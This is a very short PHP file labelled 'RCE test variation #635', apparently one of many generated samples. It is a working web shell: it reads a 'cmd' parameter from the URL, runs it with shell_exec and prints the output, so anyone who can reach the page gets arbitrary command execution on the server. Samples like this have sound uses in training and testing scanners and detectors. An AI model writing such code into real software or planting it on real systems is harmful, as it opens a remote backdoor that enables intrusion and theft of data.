<?php
// RCE test variation #635
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>